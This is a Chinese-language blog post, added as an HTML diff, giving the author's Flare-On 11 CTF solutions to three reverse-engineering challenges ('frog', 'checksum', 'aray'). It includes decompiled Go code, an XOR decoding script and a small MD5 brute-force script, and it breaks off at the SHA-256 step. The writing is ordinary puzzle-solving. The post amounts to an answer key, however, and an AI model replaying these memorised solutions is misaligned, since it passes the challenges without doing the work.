@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Flare-on CTF 11-writeup
+Author: 堇姬Naup
+
+雖然不是玩reverse的，不過感覺蠻好玩的，所以還是跑來打flare-on CTF了結果是解了 5&amp;#x2F;10，其中有解出第五題大家都說很難的題目
+
+
+
+1-frog首先是第一題算是簽到題，是一個pygame做的小"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="FlareOn-11"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Flare-on CTF 11-writeup
+Author: 堇姬Naup
+
+雖然不是玩reverse的，不過感覺蠻好玩的，所以還是跑來打flare-on CTF了結果是解了 5&amp;#x2F;10，其中有解出第五題大家都說很難的題目
+
+
+
+1-frog首先是第一題算是簽到題，是一個pygame做的小"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>FlareOn-11 | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>FlareOn-11</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-11-13
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Flare-on-CTF-11-writeup"><a href="#Flare-on-CTF-11-writeup" class="headerlink" title="Flare-on CTF 11-writeup"></a>Flare-on CTF 11-writeup</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<p>雖然不是玩reverse的，不過感覺蠻好玩的，所以還是跑來打flare-on CTF了<br>結果是解了 5&#x2F;10，其中有解出第五題大家都說很難的題目</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/1.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/1.png" class=""></div>
+
+
+<h1 id="1-frog"><a href="#1-frog" class="headerlink" title="1-frog"></a>1-frog</h1><p>首先是第一題算是簽到題，是一個pygame做的小遊戲，並且有給source code</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/2.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/2.png" class=""></div>
+
+<p>看了一下，當我到達 victory_tile.x 跟 victory_tile.y 就會噴出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># are they on the victory tile? if so do victory</span></span><br><span class="line"><span class="keyword">if</span> player.x == victory_tile.x <span class="keyword">and</span> player.y == victory_tile.y:</span><br><span class="line">   victory_mode = <span class="literal">True</span></span><br><span class="line">   flag_text = GenerateFlagText(player.x, player.y)</span><br><span class="line">   flag_text_surface = flagfont.render(flag_text, <span class="literal">False</span>, pygame.Color(<span class="string">&#x27;black&#x27;</span>))</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span> % flag_text)</span><br></pre></td></tr></table></figure>
+
+<p>當到達 <code>(10、10)</code>，也就是flare on雕像的右下角，就可以get flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victory_tile = pygame.Vector2(<span class="number">10</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+
+<p>這邊可以看到生成圍牆，如果我把一些block刪除掉，就可以到達victory了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BuildBlocks</span>():</span><br><span class="line">    blockset = [</span><br><span class="line">        Block(<span class="number">3</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br><span class="line">        Block(<span class="number">4</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br><span class="line">        Block(<span class="number">5</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br><span class="line">        Block(<span class="number">6</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br><span class="line">        Block(<span class="number">7</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br><span class="line">        Block(<span class="number">8</span>, <span class="number">2</span>, <span class="literal">False</span>),</span><br></pre></td></tr></table></figure>
+<p>我刪掉了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block(5, 2, False),</span><br><span class="line">Block(6, 4, False),</span><br></pre></td></tr></table></figure>
+
+<p>移動frog到終點就get flag</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/3.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/3.png" class=""></div>
+
+
+<h1 id="2-checksum"><a href="#2-checksum" class="headerlink" title="2 - checksum"></a>2 - checksum</h1><p>golang逆向<br>前面有加減乘除，他會random round數以及哪兩個數字並相加</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)&amp;v135 &lt;= *(_QWORD *)(v1 + <span class="number">16</span>) )</span><br><span class="line">  runtime_morestack_noctxt();</span><br><span class="line">round_random = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, <span class="number">5LL</span>);</span><br><span class="line">ans_plus = (<span class="type">int</span> *)runtime_newobject(&amp;RTYPE_int);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; i = v140 + <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  ROUND = round_random + <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= round_random + <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v140 = i;</span><br><span class="line">  num1 = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, <span class="number">10000LL</span>);</span><br><span class="line">  num2 = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, <span class="number">10000LL</span>);</span><br><span class="line">  v161 = v2;</span><br><span class="line">  v162 = v2;</span><br><span class="line">  v16 = runtime_convT64(num1, <span class="number">10000</span>, v11, v0, ROUND, v12, v13, v14, v15, v120);</span><br><span class="line">  *(_QWORD *)&amp;v161 = &amp;RTYPE_int;</span><br><span class="line">  *((_QWORD *)&amp;v161 + <span class="number">1</span>) = v16;</span><br><span class="line">  v21 = runtime_convT64(num2, <span class="number">10000</span>, (<span class="type">int</span>)&amp;RTYPE_int, v0, ROUND, v17, v18, v19, v20, v121);</span><br><span class="line">  *(_QWORD *)&amp;v162 = &amp;RTYPE_int;</span><br><span class="line">  *((_QWORD *)&amp;v162 + <span class="number">1</span>) = v21;</span><br><span class="line">  plus_result = num1 + num2;</span><br><span class="line">  fmt_Fprintf(<span class="number">21LL</span>, &amp;v161, (<span class="type">const</span> <span class="type">char</span> *)(num1 + num2), <span class="string">&quot;Check sum: %d + %d = &quot;</span>, <span class="number">2LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  v160[<span class="number">0</span>] = &amp;RTYPE__ptr_int;</span><br><span class="line">  v160[<span class="number">1</span>] = ans_plus;</span><br><span class="line">  v22 = os_Stdin;</span><br><span class="line">  fmt_Fscanf(</span><br><span class="line">    <span class="number">3LL</span>,</span><br><span class="line">    v160,</span><br><span class="line">    (<span class="type">const</span> <span class="type">char</span> *)ans_plus,</span><br><span class="line">    <span class="string">&quot;%d\n%s\nnil01_\\\\?adxaesshaavxfmaEOF m=125625nanNaNintmapptr...finobjgc %: gp  *(in  n= )\n -   P  MPC= &lt; end &gt; ]:\n???pc=  Gopenread&quot;</span>,</span><br><span class="line">    <span class="number">1LL</span>,</span><br><span class="line">    <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure>
+<p>多做幾次他就會跳出來了<br>以上都是煙霧彈</p>
+<p>當通過上面的部分後，會讓你輸入checksum，之後進入main_a</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">len = v85;</span><br><span class="line">v97 = runtime_slicebytetostring((<span class="type">unsigned</span> <span class="type">int</span>)&amp;v134, v85, v90, v79, v90, v91, v86, (_DWORD)v87, v88, v125, v130, v132);</span><br><span class="line"><span class="keyword">if</span> ( len == p_string-&gt;len )</span><br><span class="line">&#123;</span><br><span class="line">  len = (__int64)p_string-&gt;ptr;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)runtime_memequal(v97, p_string-&gt;ptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    len = p_string-&gt;len;</span><br><span class="line">    v98 = main_a(p_string-&gt;ptr, len, (__int64)p_string, v79, v90, v99, v100, v101, v102);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v98 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重點關注main_a(以下我有簡單改過變數名稱了)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">__int64 __golang <span class="title function_">main_a</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *p_string,</span></span><br><span class="line"><span class="params">        __int64 lengrh,</span></span><br><span class="line"><span class="params">        __int64 a3,</span></span><br><span class="line"><span class="params">        __int64 a4,</span></span><br><span class="line"><span class="params">        __int64 a5,</span></span><br><span class="line"><span class="params">        __int64 a6,</span></span><br><span class="line"><span class="params">        __int64 a7,</span></span><br><span class="line"><span class="params">        __int64 a8,</span></span><br><span class="line"><span class="params">        __int64 a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v9; <span class="comment">// r14</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r11d</span></span><br><span class="line">  _BYTE *v16; <span class="comment">// rdx</span></span><br><span class="line">  __int64 idx; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// dl</span></span><br><span class="line">  __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp-20h] [rbp-28h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp-20h] [rbp-28h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp-18h] [rbp-20h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp-18h] [rbp-20h]</span></span><br><span class="line">  _BYTE *v28; <span class="comment">// [rsp+0h] [rbp-8h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+10h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v30; <span class="comment">// [rsp+18h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)&amp;retaddr &lt;= *(_QWORD *)(v9 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v30 = p_string;</span><br><span class="line">    runtime_morestack_noctxt(p_string, lengrh, a3, a4, a5, a6, a7, a8, a9);</span><br><span class="line">    p_string = v30;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !p_string )</span><br><span class="line">    p_string = &amp;runtime_noptrbss;</span><br><span class="line">  v28 = p_string;</span><br><span class="line">  v10 = runtime_makeslice((<span class="type">unsigned</span> <span class="type">int</span>)&amp;RTYPE_uint8, lengrh, lengrh, a4, a5, a6, a7, a8, a9, v24, v26);</span><br><span class="line">  v16 = v28;</span><br><span class="line">  <span class="keyword">for</span> ( idx = <span class="number">0LL</span>; lengrh &gt; idx; ++idx )</span><br><span class="line">  &#123;</span><br><span class="line">    a5 = v10;</span><br><span class="line">    v18 = v16;</span><br><span class="line">    v19 = idx - <span class="number">11</span> * ((__int64)((<span class="type">unsigned</span> __int128)(idx * (__int128)<span class="number">0x5D1745D1745D1746</span>LL) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    v20 = v16[idx];</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= <span class="number">0xB</span> )</span><br><span class="line">      runtime_panicIndex(v19, idx, <span class="number">11LL</span>, v18);</span><br><span class="line">    v11 = <span class="string">&quot;FlareOn2024bad verb &#x27;%0123456789_/dev/stdout/dev/stderrCloseHandleOpenProcessGetFileTypeshort write30517578125bad argSizemethodargs(reflect.SetProcessPrngMoveFileExWNetShareAddNetShareDeluserenv.dllassistQueuenetpollInitreflectOffsglobalAllocmSpanManualstart traceclobberfreegccheckmarkscheddetailcgocall nilunreachable s.nelems=   of size  runtime: p  ms clock,  nBSSRoots=runtime: P  exp.) for minTrigger=GOMEMLIMIT=bad m value, elemsize= freeindex= span.list=, npages = tracealloc( p-&gt;status= in status  idleprocs= gcwaiting= schedtick= timerslen= mallocing=bad timedivfloat64nan1float64nan2float64nan3float32nan2GOTRACEBACK) at entry+ (targetpc= , plugin: runtime: g : frame.sp=created by broken pipebad messagefile existsbad addressRegCloseKeyCreateFileWDeleteFileWExitProcessFreeLibrarySetFileTimeVirtualLockWSARecvFromclosesocketgetpeernamegetsocknamecrypt32.dllmswsock.dllsecur32.dllshell32.dlli/o timeoutavx512vnniwavx512vbmi2LocalAppDatashort buffer152587890625762939453125OpenServiceWRevertToSelfCreateEventWGetConsoleCPUnlockFileExVirtualQueryadvapi32.dlliphlpapi.dllkernel32.dllnetapi32.dllsweepWaiterstraceStringsspanSetSpinemspanSpecialgcBitsArenasmheapSpecialgcpacertracemadvdontneedharddecommitdumping heapchan receivelfstack.push span.limit= span.state=bad flushGen MB stacks, worker mode  nDataRoots= nSpanRoots= wbuf1=&lt;nil&gt; wbuf2=&lt;nil&gt; gcscandone runtime: gp= found at *( s.elemsize= B (&quot;</span>;</span><br><span class="line">    v12 = (<span class="type">unsigned</span> __int8)aTrueeeppfilepi[v19 + <span class="number">3060</span>];</span><br><span class="line">    *(_BYTE *)(a5 + idx) = v12 ^ v20;</span><br><span class="line">    v10 = a5;</span><br><span class="line">    v16 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  v21 = v10;</span><br><span class="line">  v22 = encoding_base64__ptr_Encoding_EncodeToString(</span><br><span class="line">          runtime_bss,</span><br><span class="line">          v10,</span><br><span class="line">          lengrh,</span><br><span class="line">          lengrh,</span><br><span class="line">          a5,</span><br><span class="line">          (_DWORD)v11,</span><br><span class="line">          v12,</span><br><span class="line">          v13,</span><br><span class="line">          v14,</span><br><span class="line">          v25,</span><br><span class="line">          v27);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">88</span> )</span><br><span class="line">    <span class="keyword">return</span> runtime_memequal(</span><br><span class="line">             v22,</span><br><span class="line">             <span class="string">&quot;cQoFRQErX1YAVw1zVQdFUSxfAQNRBXUNAxBSe15QCVRVJ1pQEwd/WFBUAlElCFBFUnlaB1ULByRdBEFdfVtWVA==&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>checksum輸進去就是xor而已<br>他會去跟<code>aTrueeeppfilepi[v19 + 3060]</code>開始做xor</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00000000004C8030                 db &#x27;2bf16FlareOn2024bad verb &#x27;,27h,&#x27;%0123456789_/dev/stdout/dev/stder&#x27;</span><br><span class="line">.rdata:00000000004C806B                 db &#x27;rCloseHandleOpenProcessGetFileTypeshort write30517578125bad argSi&#x27;</span><br><span class="line">.rdata:00000000004C80AC                 db &#x27;zemethodargs(reflect.SetProcessPrngMoveFileExWNetShareAddNetShare&#x27;</span><br></pre></td></tr></table></figure>
+<p>那位置就是 <code>FlareOn2024</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = base64.b64decode(<span class="string">&quot;cQoFRQErX1YAVw1zVQdFUSxfAQNRBXUNAxBSe15QCVRVJ1pQEwd/WFBUAlElCFBFUnlaB1ULByRdBEFdfVtWVA==&quot;</span>)</span><br><span class="line">b = <span class="string">&quot;FlareOn2024&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor(f, b))</span><br></pre></td></tr></table></figure>
+
+<p>將他輸入到checksum(REAL_FLAREON_FLAG.JPG)後圖片會生成到你的電腦上<br>他有寫他輸出到哪裡不過我看不是很懂，所以直接用</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/3_1.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/3_1.png" class=""></div>
+
+
+<p>把圖片從電腦裡抓出來</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/4.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/4.png" class=""></div>
+
+<h1 id="3-aray"><a href="#3-aray" class="headerlink" title="3 - aray"></a>3 - aray</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import &quot;hash&quot;</span><br><span class="line"></span><br><span class="line">rule aray</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;Matches on b7dc94ca98aa58dabb5404541c812db2&quot;</span><br><span class="line">    condition:</span><br><span class="line">        filesize == 85 and hash.md5(0, filesize) == &quot;b7dc94ca98aa58dabb5404541c812db2&quot; and filesize ^ uint8(1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>這個題目是個yara rule file，有點亂，我先寫個腳本dump出我的條件，並排序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">file_size</span><br><span class="line">filesize == 85</span><br><span class="line">0</span><br><span class="line">uint8(0) % 25 &lt; 25</span><br><span class="line">filesize ^ uint8(0) != 16</span><br><span class="line">filesize ^ uint8(0) != 41</span><br><span class="line">uint8(0) &amp; 128 == 0</span><br><span class="line">uint8(0) &lt; 129</span><br><span class="line">uint8(0) &gt; 30</span><br><span class="line">1</span><br><span class="line">uint8(1) &gt; 19</span><br><span class="line">uint8(1) % 17 &lt; 17 </span><br><span class="line">uint8(1) &amp; 128 == 0 </span><br><span class="line">uint8(1) &lt; 158</span><br><span class="line">filesize ^ uint8(1) != 232 </span><br><span class="line">filesize ^ uint8(1) != 0 </span><br><span class="line">2</span><br><span class="line">filesize ^ uint8(2) != 205 </span><br><span class="line">filesize ^ uint8(2) != 54 </span><br><span class="line">uint8(2) % 28 &lt; 28</span><br><span class="line">uint8(2) + 11 == 119 </span><br><span class="line">uint8(2) &gt; 20 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>先來解釋一下每種不同函數的意思</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>函數</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>uint8(x)</td>
+<td>一個bytes，x是索引</td>
+</tr>
+<tr>
+<td>uint32(x)</td>
+<td>四個bytes，代表[x:x+4]</td>
+</tr>
+<tr>
+<td>hash.md5(x,y)</td>
+<td>代表[x:x+y]md5</td>
+</tr>
+<tr>
+<td>hash.crc32(x,y)</td>
+<td>代表[x:x+y]crc32</td>
+</tr>
+<tr>
+<td>hash.sha256(x,y)</td>
+<td>代表[x:x+y]sha256</td>
+</tr>
+</tbody></table>
+<p>只要我們找出一個長度是85字串能符合上面條件的就是flag<br>一開始還原就會遇到問題了，uint8給的條件太少，單看uint8基本上所有printable char都會符合<br>所以先來做hash還原，只有兩個bytes直接爆破</p>
+<p>md5腳本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">target_hash = <span class="string">&#x27;738a656e8e8ec272ca17cd51e12f558b&#x27;</span></span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(characters, repeat=<span class="number">2</span>):</span><br><span class="line">    candidate_str = <span class="string">&#x27;&#x27;</span>.join(candidate)</span><br><span class="line">    candidate_hash = hashlib.md5(candidate_str.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> candidate_hash == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;success: <span class="subst">&#123;candidate_str&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>sha256腳本</p>
